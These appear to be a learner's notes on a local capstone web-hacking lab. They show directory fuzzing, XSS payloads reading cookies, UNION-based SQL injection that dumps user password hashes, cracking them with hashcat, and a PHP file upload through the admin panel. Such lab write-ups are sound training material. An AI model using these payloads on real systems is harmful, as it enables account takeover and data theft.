
to reset
localhost/capstone/init.php

# Enumeration

```sh
ffuf -u http://localhost/capstone/FUZZ -w /usr/share/wordlists/dirb/common.txt  
```

![[Pasted image 20230731161758.png]]

FUZZ the admin page

```sh
ffuf -u http://localhost/capstone/admin/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php
```

![[Pasted image 20230731173013.png]]

302 for /capstone/admin/admin.php

***test every URL for all types of vulnerabilities***

1)XSS

logged in users can post reviews and when submitted, request sent to server so not DOM XSS possibility
others can view the comments, can try stored XSS

```js
<script>alert(document.cookie)</script>
```

![[Pasted image 20230731143130.png]]

stroed XSS ✅

A message displayed on successful login

![[Pasted image 20230731160430.png]]

can chnage content of it by change the value of message parameter

![[Pasted image 20230731160509.png]]

can try for Reflected XSS since Request being sent to server 
and getting response back immediately, so changes in network tab

exit the \<p> tag

```html
</p><script>alert(document.cookie)</script>
```

or can do it without exting \<p> tag

```html
<script>alert(document.cookie)</script>
```

![[Pasted image 20230731160751.png]]

Reflected XSS✅

2)IDOR

\http://localhost/capstone/coffee.php?coffee=1
can look for IDOR to find hidden pages

```sh
ffuf -u 'http://localhost/capstone/coffee.php?coffee=FUZZ' -w capstoneNum.txt

```

need to add quotes because fuzzing value of parameter

no results

so no IDOR

3)SQLi ✅

in reviews form
try
i/p: test' or 1=1#
o/p: 1\\' or 1=1#
so ' being escaped

try 
i/p: test\\' or 1=1#

so \\ before '  escapes the \\ we input
o/p: test\\\\\\' or 1=1#

but \\ also being escaped

results of sqlmap: all tested parameters do not appear to be injectable

try for SQLi in url

\localhost/capstone/coffee.php?coffee=2' or 1=1#

this dosent work, try -- - terminator

\localhost/capstone/coffee.php?coffee=2' or 1=1-- -

and it returns all the products as well as user comments

![[Pasted image 20230731162328.png]]


so probably its

select coffee
from table 
where id=2

now try to figure out number of columns 
we see coffee has some 5 properties and image so maybe start with 6 columns


\localhost/capstone/coffee.php?coffee=2' union select null,null,null,null,null,null-- -

works for 7 columns

\localhost/capstone/coffee.php?coffee=2' union select null,null,null,null,null,null,null-- -

find which null is for which parameter

\localhost/capstone/coffee.php?coffee=2' union select null,'string1',null,'string2',null,null,null-- -

input some strings or nums(data type should match)

![[Pasted image 20230731163422.png]]

to get tables, replace string with table_name

\localhost/capstone/coffee.php?coffee=2' union select null,table_name,null,null,null,null,null from information_schema.tables-- -

![[Pasted image 20230731163753.png]]


we get lots of tables

try to get all column names

\localhost/capstone/coffee.php?coffee=2' union select null,column_name,null,null,null,null,null from information_schema.columns-- -

![[Pasted image 20230731164345.png]]

try to get other users data from the columns `username` and `password`

\localhost/capstone/coffee.php?coffee=2' union select null,column_name,null,username,password,null,null from users-- -

![[Pasted image 20230731164636.png]]

we get username and hashes

![[Pasted image 20230731164915.png]]

algo used for hashing: Blowfish

mode for hashcat =3200

```sh
hashcat -m 3200 hash.txt /usr/share/seclists/SecLists-master/Passwords/xato-net-10-million-passwords-10000.txt 

```


found password : captain1

use sqlmap for : \localhost/capstone/coffee.php?coffee=2


```sh
sqlmap -r capstoneReq.txt -T users --dump

```

![[Pasted image 20230731170838.png]]

we found jeremy's password with hashcat

try logging in as jeremy

while fuzzing we got 301 to admin and assets, try going to those URL now because jeremy is an admin 
the page /admin is accessible

localhost://capstone/admin/admin.php

![[Pasted image 20230731171748.png]]

4)Insecure File Upload ✅

we get a file upload feature

try uploading a file, capture the request and try to upload a php file

![[Pasted image 20230731172113.png]]

![[Pasted image 20230731172358.png]]

rename and upload and it works

it is uploaded to 

![[Pasted image 20230731172604.png]]

/assets/11.png

as a normal user go to
/capstone/assets/11.php

![[Pasted image 20230731172751.png]]

